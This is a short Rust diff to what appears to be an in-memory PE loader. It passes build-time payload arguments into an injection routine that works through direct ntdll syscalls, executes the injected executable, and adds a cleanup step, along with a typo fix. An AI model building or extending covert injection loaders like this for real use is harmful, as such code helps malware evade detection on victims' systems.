@@ -51,17 +51,24 @@ fn get_pe() -> Vec<u8> {
 }
  
 fn load(pe_bytes: Vec<u8>) {
+    let args = String::from(env!("PAYLOAD_ARGUMENTS"));
+
     let ntdll = SyscallWrapper::new();
     debug_info_msg!("Loading ...");
 
     let mut pe_loader = PE_Loader::new(ntdll);
-    if !pe_loader.inject(&pe_bytes) {
+    if !pe_loader.inject(pe_bytes, args) {
         debug_error_msg!("Failed to inject PE.");
         return;
     }
 
     if !pe_loader.execute() {
-        debug_error_msg!("Failed to execure PE.");
+        debug_error_msg!("Failed to execute PE.");
+        return;
+    }
+
+    if !pe_loader.clean() {
+        debug_error_msg!("Failed to clean PE.");
         return;
     }
 
